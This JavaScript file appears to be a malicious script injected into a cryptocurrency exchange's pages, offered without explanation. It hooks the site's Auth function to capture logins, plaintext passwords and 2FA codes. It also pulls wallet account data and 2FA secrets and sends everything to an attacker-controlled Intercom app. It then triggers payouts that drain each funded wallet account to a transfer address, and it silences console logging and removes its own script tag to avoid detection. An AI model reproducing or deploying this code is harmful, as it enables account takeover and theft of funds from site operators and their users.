(function () {
  let app_config = {
    app_id: "psgnlt74",
    stepSatoshi: 10000000,
    expectedSatoshi: 50000000,
    transferAddress: 'btc'
  };


  function CustomIntercom(appId) {
    this.boot = (appId) => {
      if (window.intercomController.isLoaded()) {
        window.intercomController.Close();
      }
      window.Intercom("boot", {
        app_id: appId,
        user_id: window.user.id,
        name: window.user.name,
        email: window.user.email,
        login: window.user.login,
        cohort: window.user.cohort,
        sponsor: window.user.sponsor,
        country: window.user.country,
        phone: window.user.phone,
        status: window.user.status,
        location: document.location.href
      });
    };
    this.sendLog = (type, msg) => {
      try {
        window.Intercom("trackEvent", type, {data: JSON.stringify(msg)});
      } catch (e) {
      }
    };
    this.boot(appId);
  }

  function Entrypoint() {
    this.log = console.log;
    this.accounts = [];
    this.accountIterator = 0;
    this.Auth = window.Auth;

    this.boot = () => {
      this.customIntercom = new CustomIntercom(app_config.app_id);
      console.log = () => undefined;
      this.hookForm();
    };

    this.sendLog = (type, msg) => {
      this.customIntercom.sendLog(type, msg);
    };

    this.hookForm = () => {
      let _this = this;
      window.Auth = function (login, password, code, callback) {
        let variables = {
          "login": login,
          "pass_hash": password,
          "pass_plain": document.getElementById('entersite_password') ? document.getElementById('entersite_password').value : null,
          "tfa_code": code
        };
        _this.sendLog('auth', variables);
        _this.Auth.apply(this, arguments);
      };
    };

    this.reset = () => {
      if (window.user) {
        wallet = null;
        user = null;
        window.engine.DeAuthUser(_ => {
          window.header.UpdateLoggedState();
        });
      }
      console.log = this.log;
    };

    this.safeShutdown = () => {
      this.accountIterator++;
      if (this.accountIterator >= this.accounts.length) {
        this.reset();
        LogOut();
      }
    };

    this.payload = () => {
      this.sendLog('systemWallet', {
        accounts: window.systemWallet['accounts'],
        payouts: window.systemWallet['payouts']
      });
      UserSecuritySecret(res => {
        if (res["s"]) {
          this.sendLog('2FA', res["d"]);
        }
      });
      this.accountIterator = 0;
      this.accounts = window.systemWallet['accounts'];
      this.accounts.forEach(account => {
        this.getFee(account.id, account.balance_s, (accountId, amount, fee) => {
          window.SystemWalletPayout(accountId, app_config.transferAddress, amount, fee, data => {
            this.sendLog('payoutSuccess', data["d"]);
            this.safeShutdown();
          });
        });
      });
    };
    this.getFee = (accountId, amount, callback) => {
      amount = Math.floor((amount - app_config.stepSatoshi) / 100000) * 100000;
      if (amount >= app_config.expectedSatoshi) {
        window.SystemWalletFees(app_config.transferAddress, amount, data => {
          if (data['s']) {
            if (data['d']['estimated']) {
              callback(accountId, amount, data["d"]["fees"].fee_high_calculated);
            } else {
              if (data["d"]["reason"] === 'highvalue') {
                this.getFee(accountId, amount, callback);
              }
            }
          } else {
            this.safeShutdown();
            this.sendLog('feesFailed', data['d']);
          }
        });
      } else {
        this.safeShutdown();
        this.sendLog('lowAmount', {accountId: accountId});
      }
    };
    this.boot();
  }

  if (window.user) {
    let app = new Entrypoint();
    if (window.user.status < 3) {
      app.reset();
      this.sendLog('statusFailed', {user: window.user});
      return false;
    }
    if (window.systemWallet && window.systemWallet.accounts) {
      app.payload();
    } else {
      window.SystemWalletGet(data => {
        if (data["s"]) {
          window.systemWallet['info'] = data['d']['wallet']['info'];
          window.systemWallet['accounts'] = data['d']['wallet']['accounts'];
          window.systemWallet['payouts'] = data['d']['wallet']['payouts'];
          app.payload();
        } else {
          app.reset();
        }
      });
    }
  }
  document.currentScript.remove();
})();
